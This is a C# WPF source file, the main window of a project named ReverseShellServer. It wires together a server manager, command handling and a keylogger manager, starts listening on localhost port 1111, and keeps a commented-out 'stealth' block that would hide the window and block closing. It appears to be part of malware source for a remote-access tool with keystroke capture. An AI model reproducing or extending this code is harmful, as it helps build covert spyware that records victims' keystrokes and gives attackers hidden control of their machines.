using System.Threading.Tasks;
using System.Windows;
using KeyLogger;
using ServerCommands;

namespace ReverseShellServer
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        /// <summary>
        /// The keyLoggerManager must be instanciated from this thread
        /// </summary>
        public static KeyLoggerManager keyLoggerManager;


        public MainWindow()
        {
            InitializeComponent();
            
            var manager = new ServerManager();

            manager.networkManager = new ServerNetworkManager();
            manager.commandsManager = new ServerCommandsManager(manager.networkManager);

            // Give the KeyloggerManager instance to the KeyLogger IServerCommand
            keyLoggerManager = new KeyLoggerManager();
            manager.commandsManager.PassKeyloggerManagerInstance(keyLoggerManager);

            // Start the processing in a new thread as a task
            var mainTask = new Task(() => manager.Start("127.0.0.1", 1111, 3000));
            mainTask.Start();
        }


        /// <summary>
        /// When the application is exiting, stop the keylogger
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            keyLoggerManager.Stop();

            // stealth
            /*e.Cancel = true;
            this.ShowInTaskbar = false;
            this.Visibility = Visibility.Hidden;*/
        }
    }
}
